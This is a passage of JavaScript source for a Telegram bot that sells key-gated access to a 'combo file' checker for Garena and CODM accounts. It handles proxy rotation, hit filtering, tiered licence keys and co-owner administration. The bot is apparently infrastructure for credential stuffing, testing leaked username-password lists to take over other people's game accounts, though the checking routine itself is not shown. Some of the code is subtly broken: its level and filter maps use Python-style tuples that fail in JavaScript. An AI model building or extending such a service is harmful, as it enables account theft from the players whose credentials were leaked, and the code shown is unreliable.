      buildDeleteKeyKeyboard(keys, sel, now));
    return;
  }

  if (data === 'dk_confirm') {
    if (!isOwner(fromUser)) return;
    const sel = deleteKeySelection[chatId] || new Set();
    if (!sel.size) {
      tgAnswerCallback(token, cqId, '⚠️ No keys selected!');
      return;
    }
    const keys = loadKeys();
    const deleted = [];
    (async () => {
      for (const k of sel) {
        if (keys[k]) {
          await deleteKeyFromApi(keys[k]);
          deleted.push(k);
          delete keys[k];
        }
      }
      saveKeys(keys);
      tgEditMessage(token, chatId, message.message_id,
        `🗑 <b>Deleted ${deleted.length} key(s)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        deleted.map(k => `  🔑 <code>${k}</code>`).join('\n') +
        `\n\n📋 <b>Remaining keys: ${Object.keys(keys).length}</b>`, []);
      delete deleteKeySelection[chatId];
    })();
    return;
  }

  if (data === 'dk_cancel') {
    if (!isOwner(fromUser)) return;
    delete deleteKeySelection[chatId];
    tgEditMessage(token, chatId, message.message_id,
      '❌ <b>Delete cancelled.</b> No keys were removed.', []);
    return;
  }

  if (data === 'dk_noop') return;

  // ── Genkey wizard ────────────────────────────────────────────────────
  // ── Genkey wizard: Tier (Step 1) ──
  if (data.startsWith('gk_tier:')) {
    if (!isOwner(fromUser)) return;
    const tier = data.split(':')[1];
    genkeyWizard[chatId] = { step: 'AWAIT_FORMAT', tier };
    askGenkeyFormat(token, chatId);
    return;
  }

  // ── Genkey wizard: Format (Step 2) ──
  if (data.startsWith('gk_fmt:')) {
    if (!isOwner(fromUser)) return;
    const wiz = genkeyWizard[chatId];
    if (!wiz || wiz.step !== 'AWAIT_FORMAT') {
      tgSend(token, chatId, '⚠️ Session expired. Use /generate_key again.');
      return;
    }
    wiz.format = data.split(':')[1];
    wiz.step = 'AWAIT_EXPIRY';
    askGenkeyExpiry(token, chatId);
    return;
  }

  // ── Genkey wizard: Expiry hours (Step 3 — sub-day) ──
  if (data.startsWith('gk_exp_h:')) {
    if (!isOwner(fromUser)) return;
    const wiz = genkeyWizard[chatId];
    if (!wiz || wiz.step !== 'AWAIT_EXPIRY') {
      tgSend(token, chatId, '⚠️ Session expired. Use /generate_key again.');
      return;
    }
    const hours = parseInt(data.split(':')[1]);
    wiz.expiry_seconds = hours * 3600;
    wiz.expiry_days = 0;
    wiz.step = 'AWAIT_COMBO';
    askGenkeyCombo(token, chatId);
    return;
  }

  // ── Genkey wizard: Expiry days (Step 3 — day-based) ──
  if (data.startsWith('gk_exp:')) {
    if (!isOwner(fromUser)) return;
    const wiz = genkeyWizard[chatId];
    if (!wiz || wiz.step !== 'AWAIT_EXPIRY') {
      tgSend(token, chatId, '⚠️ Session expired. Use /generate_key again.');
      return;
    }
    const days = parseInt(data.split(':')[1]);
    if (days === 0) {
      wiz.expiry_days = 0;
      wiz.expiry_seconds = 0;
    } else {
      wiz.expiry_days = days;
      wiz.expiry_seconds = 0;
    }
    wiz.step = 'AWAIT_COMBO';
    askGenkeyCombo(token, chatId);
    return;
  }

  // ── Genkey wizard: Combo Limit (Step 4) ──
  if (data.startsWith('gk_lim:')) {
    if (!isOwner(fromUser)) return;
    const wiz = genkeyWizard[chatId];
    if (!wiz || wiz.step !== 'AWAIT_COMBO') {
      tgSend(token, chatId, '⚠️ Session expired. Use /generate_key again.');
      return;
    }
    wiz.combo_limit = parseInt(data.split(':')[1]);
    wiz.step = 'AWAIT_REDEEMS';
    askGenkeyRedeems(token, chatId);
    return;
  }

  // ── Genkey wizard: Max Redemptions (Step 5) ──
  if (data.startsWith('gk_usr:')) {
    if (!isOwner(fromUser)) return;
    const wiz = genkeyWizard[chatId];
    if (!wiz || wiz.step !== 'AWAIT_REDEEMS') {
      tgSend(token, chatId, '⚠️ Session expired. Use /generate_key again.');
      return;
    }
    wiz.max_users = parseInt(data.split(':')[1]);
    wiz.step = 'AWAIT_COUNT';
    askGenkeyCount(token, chatId);
    return;
  }

  // ── Genkey wizard: Count (Step 6) ──
  if (data.startsWith('gk_cnt:')) {
    if (!isOwner(fromUser)) return;
    const wiz = genkeyWizard[chatId];
    if (!wiz || wiz.step !== 'AWAIT_COUNT') {
      tgSend(token, chatId, '⚠️ Session expired. Use /generate_key again.');
      return;
    }
    wiz.count = parseInt(data.split(':')[1]);
    finalizeGenKey(token, chatId);
    return;
  }

  if (data === 'gk_cancel') {
    delete genkeyWizard[chatId];
    tgSend(token, chatId, '❌ Key generation cancelled.');
    return;
  }

  // ── User menu buttons ────────────────────────────────────────────────
  if (data === 'user:start') {
    if (!checkAccessGate(token, chatId, fromUser)) return;
    handleStart(token, chatId, fromUser);
    return;
  }

  if (data === 'user:reset') {
    const keyId = String(fromUser.id || chatId);
    const uname = fromUser.username || '';
    delete savedUsers[keyId];
    if (uname) delete savedUsers[uname.toLowerCase().replace('@', '')];
    saveUsersToDisk();
    delete userData[chatId];
    delete botState[chatId];
    tgSend(token, chatId, '🗑 <b>Settings cleared!</b>\n\nSend /start or tap Start to reconfigure.');
    return;
  }

  if (data === 'user:stop') {
    handleStopPanel(token, chatId, fromUser);
    return;
  }

  // ── Stop buttons ────────────────────────────────────────────────────
  if (data.startsWith('stop_user:')) {
    const targetId = parseInt(data.split(':')[1]);
    if (!isOwner(fromUser) && targetId !== chatId) {
      tgAnswerCallback(token, cqId, '🚫 You can only stop your own checker.');
      return;
    }
    const evt = stopEvents[targetId];
    if (evt && !evt.isSet()) {
      evt.set();
      const saved = getSavedProfile(String(targetId));
      const label = saved?.username ? `@${saved.username}` : `id:${targetId}`;
      tgEditMessage(token, chatId, message.message_id,
        `🛑 <b>Stop signal sent to ${label}!</b>\n\nThe checker will stop after the current batch finishes.`, []);
    } else {
      tgEditMessage(token, chatId, message.message_id,
        'ℹ️ <b>That checker has already finished or stopped.</b>', []);
    }
    return;
  }

  if (data === 'stop_all') {
    if (!isOwner(fromUser)) {
      tgAnswerCallback(token, cqId, '🚫 Owner only.');
      return;
    }
    let stoppedCount = 0;
    for (const [tid, evt] of Object.entries(stopEvents)) {
      if (!evt.isSet()) { evt.set(); stoppedCount++; }
    }
    tgEditMessage(token, chatId, message.message_id,
      `☢️ <b>Stop ALL sent!</b>\n\nSent stop signal to <b>${stoppedCount}</b> running checker(s).\nThey will stop after their current batch finishes.`, []);
    return;
  }

  if (data === 'stop_cancel') {
    tgEditMessage(token, chatId, message.message_id,
      '✅ <b>Cancelled.</b> Checkers keep running.', []);
    return;
  }

  if (data === 'user:redeem') {
    tgSend(token, chatId, '🔑 <b>Redeem Key</b>\n\nType your key:\n<code>/redeem YOUR_KEY</code>');
    return;
  }

  if (data === 'user:refresh_help') {
    handleHelp(token, chatId, fromUser);
    return;
  }

  if (data === 'redeem:prompt') {
    botState[chatId] = 'AWAIT_REDEEM_KEY';
    tgSend(token, chatId,
      '🔑 <b>Enter your key:</b>\n\n<code>/redeem YOUR_KEY_HERE</code>\n\n<i>Just type it and send!</i>');
    return;
  }

  // ── Level picker ────────────────────────────────────────────────────
  if (data.startsWith('lvl:')) {
    if (!checkAccessGate(token, chatId, fromUser)) return;
    const val = data.slice(4);
    const levelMap = {
      '100': ([100], 'Level 100+'),
      '200': ([200], 'Level 200+'),
      '300': ([300], 'Level 300+'),
      '400': ([400], 'Level 400+'),
      'all': ([1],   'ALL levels'),
    };
    if (!levelMap[val]) return;
    const [thresholds, label] = levelMap[val];
    const d = udata(chatId);
    d.level = thresholds;
    askFilter(token, chatId, label);
    return;
  }

  // ── Filter picker ───────────────────────────────────────────────────
  if (data.startsWith('flt:')) {
    if (!checkAccessGate(token, chatId, fromUser)) return;
    const val = data.slice(4);
    const filterMap = {
      'clean':    ('clean',    '✅ CLEAN only'),
      'notclean': ('notclean', '❌ NOT CLEAN only'),
      'both':     ('both',     '🔄 BOTH'),
    };
    if (!filterMap[val]) return;
    const [cfValue, cfLabel] = filterMap[val];
    const d = udata(chatId);
    d.clean_filter = cfValue;
    botState[chatId] = 'AWAIT_FILE';
    saveProfile(chatId, d);

    const lvlLabel  = d.level?.[0] === 1 ? 'ALL levels' : `Level ${d.level?.[0]}+`;
    const userLimit = d.combo_limit || config.COMBO_LINE_LIMIT;

    tgSend(token, chatId,
      `✅ <b>Config saved!</b>\n\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `  🔑 Hits ID:  <code>${d.hits_id || chatId}</code>\n` +
      `  🎮 Level:    <code>${lvlLabel}</code>\n` +
      `  🔍 Hit type: <code>${cfLabel}</code>\n` +
      `  📦 Limit:    <code>${userLimit} lines</code>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `📂 <b>Upload your combo file to start!</b>\n\n` +
      `<i>Use /reset to change settings.</i>\n\n` +
      `<i>Send your file now ⬇️</i>`
    );
    return;
  }

  // ── Proxy accumulator buttons ───────────────────────────────────────
  if (data === 'proxy:done') {
    if (!isOwner(fromUser)) return;
    const result = flushProxyAccumulator(chatId, proxyAccumulator, proxyMsgIds);
    if (result) {
      geoRotator.reload();
      clearNoProxyWarning();
      persistProxies();
      tgSend(token, chatId,
        `✅ <b>Proxies saved!</b>\n\n📊 ${result.count} lines\n📡 Total: <b>${geoRotator.total}</b>`);
    } else {
      tgSend(token, chatId, '❌ <b>No proxy lines to save.</b>');
    }
    delete botState[chatId];
    return;
  }

  if (data === 'proxy:cancel') {
    if (!isOwner(fromUser)) return;
    const msgIds = proxyMsgIds[chatId] || [];
    delete proxyAccumulator[chatId];
    delete proxyMsgIds[chatId];
    delete botState[chatId];
    if (msgIds.length) tgDeleteMessagesBulk(token, chatId, msgIds);
    tgSend(token, chatId, '🗑 <b>Proxy upload cancelled.</b> Accumulator cleared.');
    return;
  }
}

// ── Parse command ──────────────────────────────────────────────────────
function parseCommand(text) {
  if (!text || !text.startsWith('/')) return ['', text];
  const parts = text.split(/\s+/);
  let cmd = parts[0].toLowerCase().slice(1);
  if (cmd.includes('@')) cmd = cmd.split('@')[0];
  const args = parts.slice(1).join(' ').trim();
  return [cmd, args];
}

// ── Handle bot update (main message/command router) ───────────────────
async function handleBotUpdate(token, update) {
  try {
    if (update.callback_query) {
      await handleCallbackQuery(token, update.callback_query);
      return;
    }

    const msg = update.message || update.edited_message;
    if (!msg) return;

    const chatId   = msg.chat?.id;
    const fromUser = msg.from || {};
    const text     = (msg.text || '').trim();
    const [cmd, cmdArgs] = parseCommand(text);

    if (cmd) {
      console.log(`[BOT] 📩 cmd=${cmd} args=${cmdArgs} from=${fromUser.id} chat=${chatId}`);
    }

    // ── Intercept text replies for genkey wizard ────────────────────────────
    if (isOwner(fromUser) && genkeyWizard[chatId]) {
      const wiz = genkeyWizard[chatId];
      // Step 3: Custom expiry input
      if (wiz.step === 'AWAIT_EXPIRY' && text && !text.startsWith('/')) {
        const dur = parseDuration(text);
        if (dur > 0) {
          wiz.expiry_seconds = dur;
          wiz.expiry_days = 0;
          wiz.step = 'AWAIT_COMBO';
          askGenkeyCombo(token, chatId);
        } else {
          tgSend(token, chatId, '❌ Invalid format. Try: <code>1d</code>  <code>12h</code>  <code>3mo</code>');
        }
        return;
      }
      // Step 4: Custom combo limit
      if (wiz.step === 'AWAIT_COMBO' && text && !text.startsWith('/')) {
        const limit = parseInt(text.trim());
        if (isNaN(limit) || limit < 0) {
          tgSend(token, chatId, '❌ Enter a number (e.g. <code>1000</code>) or <code>0</code> for unlimited.');
          return;
        }
        wiz.combo_limit = limit;
        wiz.step = 'AWAIT_REDEEMS';
        askGenkeyRedeems(token, chatId);
        return;
      }
      // Step 5: Custom max redemptions
      if (wiz.step === 'AWAIT_REDEEMS' && text && !text.startsWith('/')) {
        const maxUsers = parseInt(text.trim());
        if (isNaN(maxUsers) || maxUsers < 0) {
          tgSend(token, chatId, '❌ Enter a number (e.g. <code>10</code>) or <code>0</code> for unlimited.');
          return;
        }
        wiz.max_users = maxUsers;
        wiz.step = 'AWAIT_COUNT';
        askGenkeyCount(token, chatId);
        return;
      }
      // Step 6: Custom count
      if (wiz.step === 'AWAIT_COUNT' && text && !text.startsWith('/')) {
        const count = parseInt(text.trim());
        if (isNaN(count) || count < 1 || count > 500) {
          tgSend(token, chatId, '❌ Enter a number between <code>1</code> and <code>500</code>.');
          return;
        }
        wiz.count = count;
        finalizeGenKey(token, chatId);
        return;
      }
    }

    // ── /stop ─────────────────────────────────────────────────────────
    if (cmd === 'stop') {
      handleStopPanel(token, chatId, fromUser);
      return;
    }

    // ── /help ─────────────────────────────────────────────────────────
    if (cmd === 'help') {
      handleHelp(token, chatId, fromUser);
      return;
    }

    // ── Owner-only commands ───────────────────────────────────────────
    if (cmd === 'generate_key') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      genkeyWizard[chatId] = { step: 'AWAIT_TIER' };
      tgSendButtons(token, chatId,
        '🔑 <b>Generate Key — Step 1 of 6</b>\n\n' +
        '🏷 <b>Select Tier:</b>\n\n' +
        '<i>Free = basic access  |  VIP = premium access + more threads</i>',
        [
          [
            { text: '🆓 Free',  callback_data: 'gk_tier:free' },
            { text: '⭐ VIP',   callback_data: 'gk_tier:vip' },
          ],
          [
            { text: '❌ Cancel', callback_data: 'gk_cancel' },
          ],
        ]
      );
      return;
    }

    if (cmd === 'upload_proxy') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      delete proxyAccumulator[chatId];
      delete proxyMsgIds[chatId];
      botState[chatId] = 'AWAIT_PROXY';
      handleProxyUpload(token, chatId, fromUser, msg);
      return;
    }

    if (cmd === 'proxy_done') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      if (proxyAccumulator[chatId]?.length) {
        const userMsgId = msg.message_id;
        if (userMsgId) {
          if (!proxyMsgIds[chatId]) proxyMsgIds[chatId] = [];
          proxyMsgIds[chatId].push(userMsgId);
        }
        const result = flushProxyAccumulator(chatId, proxyAccumulator, proxyMsgIds);
        if (result) {
          geoRotator.reload();
          clearNoProxyWarning();
          persistProxies();
          tgSend(token, chatId,
            `✅ <b>Proxies saved!</b>\n\n📊 ${result.count} lines\n📡 Total: <b>${geoRotator.total}</b>`);
        }
        delete botState[chatId];
      } else {
        tgSend(token, chatId,
          '📊 <b>No proxy lines to save.</b>\n\nUse /upload_proxy first to paste proxy lines, then /proxy_done to save them.');
      }
      return;
    }

    if (cmd === 'proxystatus') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      handleProxyStatus(token, chatId);
      return;
    }

    if (cmd === 'add_coowner') {
      if (!isPrimaryOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Primary owner only command.</b>');
        return;
      }
      if (!cmdArgs) {
        const coowners = config.getCoownerIds();
        const colist = coowners.length
          ? coowners.map(uid => `  • <code>${uid}</code>`).join('\n')
          : '  <i>None</i>';
        tgSend(token, chatId,
          `👥 <b>Co-Owner Management</b>\n\n━━━━━━━━━━━━━━━━━━━━━━━━\n📋 <b>Current co-owners:</b>\n${colist}\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n<b>Usage:</b>\n<code>/add_coowner 123456789</code> — add a co-owner\n<code>/remove_coowner 123456789</code> — remove a co-owner`);
        return;
      }
      const coUid = parseInt(cmdArgs);
      if (isNaN(coUid)) {
        tgSend(token, chatId, '❌ <b>Invalid ID.</b> Use a numeric Telegram user ID.');
        return;
      }
      if (coUid === config.getOwnerId()) {
        tgSend(token, chatId, "⚠️ That's already the primary owner ID.");
        return;
      }
      if (config.getCoownerIds().includes(coUid)) {
        tgSend(token, chatId, `ℹ️ <code>${coUid}</code> is already a co-owner.`);
        return;
      }
      config.addCoowner(coUid);
      tgSend(token, chatId,
        `✅ <b>Co-owner added!</b>\n\n🔑 <code>${coUid}</code> now has owner-level access.\n👥 Total co-owners: <b>${config.getCoownerIds().length}</b>`);
      return;
    }

    if (cmd === 'remove_coowner') {
      if (!isPrimaryOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Primary owner only command.</b>');
        return;
      }
      if (!cmdArgs) {
        const coowners = config.getCoownerIds();
        const colist = coowners.length
          ? coowners.map(uid => `  • <code>${uid}</code>`).join('\n')
          : '  <i>None</i>';
        tgSend(token, chatId,
          `👥 <b>Remove Co-Owner</b>\n\n📋 <b>Current co-owners:</b>\n${colist}\n\n<b>Usage:</b> <code>/remove_coowner 123456789</code>`);
        return;
      }
      const coUid = parseInt(cmdArgs);
      if (isNaN(coUid)) {
        tgSend(token, chatId, '❌ <b>Invalid ID.</b>');
        return;
      }
      if (!config.getCoownerIds().includes(coUid)) {
        tgSend(token, chatId, `ℹ️ <code>${coUid}</code> is not a co-owner.`);
        return;
      }
      config.removeCoowner(coUid);
      tgSend(token, chatId,
        `✅ <b>Co-owner removed!</b>\n\n🔑 <code>${coUid}</code> no longer has owner access.\n👥 Remaining co-owners: <b>${config.getCoownerIds().length}</b>`);
      return;
    }

    if (cmd === 'serverstatus') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      handleServerStatus(token, chatId);
      return;
    }

    if (cmd === 'resetconfig') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      const cfgPath = config.CONFIG_FILE;
      if (fs.existsSync(cfgPath)) fs.unlinkSync(cfgPath);
      tgSend(token, chatId, '🗑 <b>Config deleted!</b>\n\nRestart the bot — it will ask for your token and owner ID again.');
      return;
    }

    if (cmd === 'stopall') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      let stoppedCount = 0;
      for (const [tid, evt] of Object.entries(stopEvents)) {
        if (!evt.isSet()) { evt.set(); stoppedCount++; }
      }
      if (stoppedCount) {
        tgSend(token, chatId, `☢️ <b>Stop ALL sent!</b>\n\nSent stop signal to <b>${stoppedCount}</b> running checker(s).`);
      } else {
        tgSend(token, chatId, 'ℹ️ No checkers are currently running.');
      }
      return;
    }

    if (cmd === 'statuskey') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      handleStatusKey(token, chatId, cmdArgs);
      return;
    }

    if (cmd === 'deletekey') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      handleDeleteKey(token, chatId, fromUser, cmdArgs);
      return;
    }

    if (cmd === 'keysystem') {
      handleKeySystemConfig(token, chatId, fromUser, cmdArgs);
      return;
    }

    // ── Proxy file upload state ───────────────────────────────────────
    if (botState[chatId] === 'AWAIT_PROXY') {
      if (msg.document) {
        delete proxyMsgIds[chatId];
        await handleProxyUpload(token, chatId, fromUser, msg);
        delete botState[chatId];
      } else if (cmd === 'done' || cmd === 'proxy_done' || text.toLowerCase() === 'done') {
        const userMsgId = msg.message_id;
        if (userMsgId) {
          if (!proxyMsgIds[chatId]) proxyMsgIds[chatId] = [];
          proxyMsgIds[chatId].push(userMsgId);
        }
        const result = flushProxyAccumulator(chatId, proxyAccumulator, proxyMsgIds);
        if (result) {
          geoRotator.reload();
          clearNoProxyWarning();
          persistProxies();
          tgSend(token, chatId,
            `✅ <b>Proxies saved!</b>\n\n📊 ${result.count} lines\n📡 Total: <b>${geoRotator.total}</b>`);
        }
        delete botState[chatId];
      } else if (text && !text.startsWith('/')) {
        await handleProxyUpload(token, chatId, fromUser, msg);
      } else {
        tgSendButtons(token, chatId,
          '📡 Keep sending proxy lines, or tap Done when finished.',
          [
            [
              { text: '✅ Done (save all)', callback_data: 'proxy:done' },
              { text: '🗑 Clear & Cancel',  callback_data: 'proxy:cancel' },
            ],
          ]
        );
      }
      return;
    }

    // ── /start — always allowed ───────────────────────────────────────
    if (cmd === 'start') {
      handleStart(token, chatId, fromUser);
      return;
    }

    // ── /reset — always allowed ───────────────────────────────────────
    if (cmd === 'reset') {
      const keyId = String(fromUser.id || chatId);
      const uname = fromUser.username || '';
      delete savedUsers[keyId];
      if (uname) delete savedUsers[uname.toLowerCase().replace('@', '')];
      saveUsersToDisk();
      delete userData[chatId];
      delete botState[chatId];
      tgSend(token, chatId, '🗑 <b>Settings cleared!</b>\n\nSend /start to choose your level and hit type again.');
      return;
    }

    // ── /redeem — always allowed ──────────────────────────────────────
    if (cmd === 'redeem') {
      handleRedeem(token, chatId, fromUser, cmdArgs);
      return;
    }

    // ── AWAIT_REDEEM_KEY state ────────────────────────────────────────
    if (botState[chatId] === 'AWAIT_REDEEM_KEY') {
      if (text && !text.startsWith('/')) {
        delete botState[chatId];
        handleRedeem(token, chatId, fromUser, text.trim());
      } else if (cmd === 'redeem') {
        delete botState[chatId];
        handleRedeem(token, chatId, fromUser, cmdArgs);
      } else {
        tgSend(token, chatId, '🔑 Just type your key and send it, or use:\n<code>/redeem YOUR_KEY</code>');
      }
      return;
    }

    // ── Access gate ───────────────────────────────────────────────────
    if (!checkAccessGate(token, chatId, fromUser)) return;

    // ── Auto-restore saved profile ────────────────────────────────────
    if (!(chatId in botState)) {
      const tgId  = fromUser.id || chatId;
      const uname = fromUser.username || '';
      const saved = getSavedProfile(String(tgId)) ||
        (uname ? getSavedProfile(uname.toLowerCase()) : null);
      if (saved) {
        const d = udata(chatId);
        d.hits_id      = saved.hits_id;
        d.username     = saved.username || uname;
        d.level        = saved.level;
        d.clean_filter = saved.clean_filter;
        d.key          = saved.key;
        d.key_expires  = saved.key_expires || 0;
        d.combo_limit  = saved.combo_limit || config.COMBO_LINE_LIMIT;
        botState[chatId] = 'AWAIT_FILE';
      } else {
        botState[chatId] = 'AWAIT_LEVEL';
      }
    }

    const state = botState[chatId] || 'AWAIT_LEVEL';

    if (state === 'AWAIT_LEVEL') {
      if (text) handleLevel(token, chatId, text);
      else askLevel(token, chatId);
      return;
    }

    if (state === 'AWAIT_FILTER') {
      if (text) handleFilter(token, chatId, text);
      else {
        const d = udata(chatId);
        const lvlLabel = d.level?.[0] === 1 ? 'ALL levels' : `Level ${d.level?.[0]}+`;
        askFilter(token, chatId, lvlLabel);
      }
      return;
    }

    if (state === 'RUNNING') {
      tgSend(token, chatId,
        '⏳ <b>Checker is still running.</b>\nSend /stop to cancel, or wait for it to finish.');
      return;
    }

    if (state === 'AWAIT_FILE') {
      if (msg.document) {
        handleFile(token, chatId, msg, fromUser);
      } else {
        tgSend(token, chatId,
          '📂 Please upload your combo file.\n' +
          "<i>Name must contain 'garena' or 'codm'</i>\n" +
          '(e.g. <code>garena.txt</code>, <code>codm.txt</code>, <code>Yuki_garena.txt</code>)\n' +
          'Or send /start to reset settings.');
      }
    }

  } catch (e) {
    console.error('[BOT] ❌ Unhandled error in update handler:', e);
    try {
      const chatId = (update.message || update.callback_query?.message || {}).chat?.id;
      if (chatId) tgSend(token, chatId, '⚠️ An error occurred. Please try again.');
    } catch {}
  }
}

// ── Long-polling ───────────────────────────────────────────────────────
async function startBotPolling(token) {
  try {
    await axios.post(`https://api.telegram.org/bot${token}/deleteWebhook`, { drop_pending_updates: false });
    console.log('[BOT] Webhook deleted — polling mode active');
  } catch (e) {
    console.warn('[BOT] deleteWebhook failed:', e.message);
  }

  let offset = 0;
  let consecutiveErrors = 0;

  console.log('[BOT] 🤖 Polling started — waiting for users...');

  while (!config.shutdownEvent.isSet()) {
    try {
      const response = await axios.get(
        `https://api.telegram.org/bot${token}/getUpdates`,
        {
          params: { timeout: 30, offset },
          timeout: 35000,
          validateStatus: () => true,
        }
      );

      consecutiveErrors = 0;

      if (response.status === 429) {
        const retryAfter = parseInt(response.headers['retry-after']) || 10;
        console.warn(`[BOT] Polling rate-limited — sleeping ${retryAfter}s`);
        await new Promise(r => setTimeout(r, retryAfter * 1000));
        continue;
      }

      if (response.status === 409) {
        console.warn('[BOT] Conflict (409) — another bot instance running? Retrying in 3s');
        await new Promise(r => setTimeout(r, 3000));
        continue;
      }

      if (response.status !== 200) {
        console.warn(`[BOT] getUpdates HTTP ${response.status} — retrying in 5s`);
        await new Promise(r => setTimeout(r, 5000));
        continue;
      }

      const payload = response.data;
      const updates = payload.result || [];

      for (const upd of updates) {
        offset = upd.update_id + 1;
        handleBotUpdate(token, upd).catch(e => {
          console.error('[BOT] Update error:', e.message);
        });
      }

    } catch (e) {
      if (e.code === 'ECONNABORTED' || e.code === 'ETIMEDOUT') continue;

      consecutiveErrors++;
      const wait = Math.min(5 * consecutiveErrors, 30);
      console.warn(`[BOT] Connection error #${consecutiveErrors}: ${e.message} — retrying in ${wait}s`);
      await new Promise(r => setTimeout(r, wait * 1000));

      if (consecutiveErrors >= 3) {
        console.log('[BOT] 🔄 Recreating polling session after repeated errors');
        consecutiveErrors = 0;
      }
    }
  }
}

// ── Memory watchdog ────────────────────────────────────────────────────
function startMemoryWatchdog() {
  const RAILWAY_RAM_MB = 512;
  const interval = setInterval(() => {
    if (config.shutdownEvent.isSet()) {
      clearInterval(interval);
      return;
    }

    const mem = process.memoryUsage();
    const rss = mem.rss / (1024 * 1024);
    const usedPct = (rss / RAILWAY_RAM_MB) * 100;

    const token = config.getBotToken();
    const ownerId = config.getOwnerId();

    if (usedPct >= 90) {
      console.warn(`[WATCHDOG] 🚨 EMERGENCY — RSS ${rss.toFixed(0)}MB / ${RAILWAY_RAM_MB}MB (${usedPct.toFixed(1)}%) — throttling to 1 thread`);
      global.globalSem = new AsyncSemaphore(1);
      try { tgSend(token, ownerId, `🚨 <b>Server RAM Emergency!</b>\n\nRSS at <b>${rss.toFixed(0)}MB / ${RAILWAY_RAM_MB}MB</b>\nThrottled to 1 checker thread.\n<i>Consider /stop some checkers</i>`); } catch {}
    } else if (usedPct >= 80) {
      console.warn(`[WATCHDOG] 🔴 CRITICAL — RSS ${rss.toFixed(0)}MB / ${RAILWAY_RAM_MB}MB (${usedPct.toFixed(1)}%) — throttling to 3 threads`);
      global.globalSem = new AsyncSemaphore(3);
    } else if (usedPct >= 70) {
      console.warn(`[WATCHDOG] 🟡 WARNING — RSS ${rss.toFixed(0)}MB / ${RAILWAY_RAM_MB}MB (${usedPct.toFixed(1)}%) — throttling to 5 threads`);
      global.globalSem = new AsyncSemaphore(5);
    }

    if (global.gc && usedPct >= 70) global.gc();

    // Check liveness — if no activity for 5 minutes, something may be stuck
    const livenessAge = getLivenessAge();
    if (livenessAge > 300) {
      console.warn(`[WATCHDOG] 💓 No liveness touch for ${Math.round(livenessAge)}s — bot may be stuck`);
    }
  }, 8000);
}

// ── Railway heartbeat ──────────────────────────────────────────────────
function startRailwayHeartbeat() {
  setInterval(() => {
    if (config.shutdownEvent.isSet()) return;
    const active = Object.values(botState).filter(s => s === 'RUNNING').length;
    const proxyCount = geoRotator.total;
    const pausedCount = Object.keys(_proxyPausedUsers).length;
    const livenessAge = Math.round(getLivenessAge());
    console.log(`[HEARTBEAT] 💓 Bot alive | ${active} checker(s) | ${proxyCount} proxies | ${pausedCount} paused | liveness ${livenessAge}s`);
  }, 300000);
}

// ═══════════════════════════════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════════════════════════════
async function main() {
  printBanner();

  // ── Handle missing config: setup wizard or wait loop ────────────────
  let BOT_TOKEN = config.getBotToken();
  let OWNER_ID  = config.getOwnerId();

  if (!BOT_TOKEN || !OWNER_ID) {
    if (config.isRailway() || !process.stdin.isTTY) {
      // Railway / no-TTY mode: wait for env vars
      console.warn('='.repeat(60));
      console.warn('⚠️  BOT_TOKEN and/or OWNER_ID not configured!');
      console.warn('   On Railway/cloud, set these environment variables:');
      console.warn('     BOT_TOKEN    = your Telegram bot token');
      console.warn('     OWNER_ID     = your Telegram numeric user ID');
      console.warn('     OWNER_USERNAME = your Telegram username (optional)');
      console.warn('     KEYSYSTEM_URL = KeyVault API URL (optional)');
      console.warn('     KEYSYSTEM_ADMIN_SECRET = KeyVault admin secret (optional)');
      console.warn('   Bot will wait and retry every 30 seconds...');
      console.warn('='.repeat(60));

      // Wait loop — keep checking for env vars
      while (!BOT_TOKEN || !OWNER_ID) {
        await new Promise(r => setTimeout(r, 30000));
        const env = config.envConfig();
        if (env.bot_token && env.owner_id) {
          BOT_TOKEN = env.bot_token;
          OWNER_ID = env.owner_id;
          // Merge into config
          const cfg = config.loadConfig();
          cfg.bot_token = BOT_TOKEN;
          cfg.owner_id = OWNER_ID;
          config.saveConfig(cfg);
          console.log('[CONFIG] ✅ Environment variables detected — starting bot!');
          break;
        }
        // Also try KeyVault API
        try {
          const api = getKeySystemAPI();
          if (api && api.enabled) {
            const remoteCfg = await api.loadState('bot_config');
            if (remoteCfg?.bot_token && remoteCfg?.owner_id) {
              BOT_TOKEN = remoteCfg.bot_token;
              OWNER_ID = remoteCfg.owner_id;
              const cfg = { ...remoteCfg };
              config.saveConfig(cfg);
              console.log('[CONFIG] ✅ KeyVault config detected — starting bot!');
              break;
            }
          }
        } catch { /* ignore */ }
        console.log('[CONFIG] Still waiting for BOT_TOKEN and OWNER_ID...');
      }
    } else {
      // Interactive mode: run setup wizard
      const readline = require('readline');
      const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

      console.log('\n╔══════════════════════════════════════════════════════════╗');
      console.log('║        🤖  FIRST-RUN SETUP WIZARD               ║');
      console.log('╚══════════════════════════════════════════════════════════╝\n');
      console.log('\x1b[93mNo config.json found — let\'s set up your bot now.\x1b[0m\n');

      // Get bot token
      BOT_TOKEN = await new Promise(resolve => {
        function askToken() {
          rl.question('\x1b[1;37m🔑 Enter your Bot Token (from @BotFather):\x1b[0m\n> ', async (token) => {
            token = token.trim();
            if (!token) {
              console.log('\x1b[91m❌ Token cannot be empty. Try again.\x1b[0m\n');
              askToken();
              return;
            }
            console.log('\x1b[93m⏳ Validating token...\x1b[0m');
